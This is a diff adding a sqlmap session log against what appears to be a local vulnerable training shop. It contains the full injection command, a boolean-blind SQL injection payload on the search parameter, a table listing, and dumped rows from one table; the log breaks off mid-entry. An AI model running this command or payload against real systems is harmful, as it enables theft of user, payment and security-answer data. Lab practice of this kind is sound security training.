@@ -126,3 +126,73 @@ back-end DBMS: SQLite
 [21:48:30] [INFO] resumed: SecurityAnswers
 [21:48:30] [INFO] resumed: Wallets
 
+
+sqlmap -u "http://localhost:3000/rest/products/search?q=apple" --level=5 --risk=3 --batch --dump
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.9#stable}
+|_ -| . [']     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 21:48:28 /2025-09-29/
+
+[21:48:30] [INFO] resuming back-end DBMS 'sqlite' 
+[21:48:30] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: q (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: q=apple%' AND 8585=8585 AND 'BxyO%'='BxyO
+---
+[21:48:30] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[21:48:30] [INFO] fetching tables for database: 'SQLite_masterdb'
+[21:48:30] [INFO] fetching number of tables for database 'SQLite_masterdb'
+[21:48:30] [INFO] resumed: 21
+[21:48:30] [INFO] resumed: Users
+[21:48:30] [INFO] resumed: sqlite_sequence
+[21:48:30] [INFO] resumed: Addresses
+[21:48:30] [INFO] resumed: Baskets
+[21:48:30] [INFO] resumed: Products
+[21:48:30] [INFO] resumed: BasketItems
+[21:48:30] [INFO] resumed: Captchas
+[21:48:30] [INFO] resumed: Cards
+[21:48:30] [INFO] resumed: Challenges
+[21:48:30] [INFO] resumed: Complaints
+[21:48:30] [INFO] resumed: Deliveries
+[21:48:30] [INFO] resumed: Feedbacks
+[21:48:30] [INFO] resumed: Hints
+[21:48:30] [INFO] resumed: ImageCaptchas
+[21:48:30] [INFO] resumed: Memories
+[21:48:30] [INFO] resumed: PrivacyRequests
+[21:48:30] [INFO] resumed: Quantities
+[21:48:30] [INFO] resumed: Recycles
+[21:48:30] [INFO] resumed: SecurityQuestions
+[21:48:30] [INFO] resumed: SecurityAnswers
+[21:48:30] [INFO] resumed: Wallets
+[21:48:30] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[21:48:30] [INFO] retrieved: CREATE TABLE `Memories` (`UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `caption` VARCHAR(255), `imagePath` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)
+[21:52:44] [INFO] fetching entries for table 'Memories'
+[21:52:44] [INFO] fetching number of entries for table 'Memories' in database 'SQLite_masterdb'
+[21:52:44] [INFO] retrieved: 10
+[21:52:45] [INFO] retrieved: 13
+[21:52:47] [INFO] retrieved: 😼 #zatschi #whoneedsfourlegs
+[21:53:18] [INFO] retrieved: 2025-09-29 19:47:29.970 +00:00
+[21:53:48] [INFO] retrieved: 1
+[21:53:49] [INFO] retrieved: assets/public/images/uploads/ᓚᘏᗢ-#zatschi-#whoneedsfourlegs-1572600969477.jpg
+[21:55:04] [INFO] retrieved: 2025-09-29 19:47:29.970 +00:00
+[21:55:34] [INFO] retrieved: 4
+[21:55:35] [INFO] retrieved: Magn(et)ificent!
+[21:55:49] [INFO] retrieved: 2025-09-29 19:47:29.970 +00:00
+[21:56:18] [INFO] retrieved: 2
+[21:56:20] [INFO] retrieved: assets/public/images/uploads/magn(et)ificent!-1571814229653.jpg
+[21:57:19] [INFO] retrieved: 2025-09-29 19:47:29.970 +00:00
+[21:57:50] [INFO] retrieved: 4
+[21:57:51] [INFO] retrieved: My rare collectors item! [̲̅$̲̅(̲̅ ͡  ͜ʖ ͡ ̲̅)̲̅$̲̅]
+[21:59:07] [INFO] retrieved: 2025-09-29 19:47:29.971 +00:00
+[21:59:36] [INFO] retrieved: 3
+[21:59:37] [INFO] retrieved: assets/publ^Aic/imag
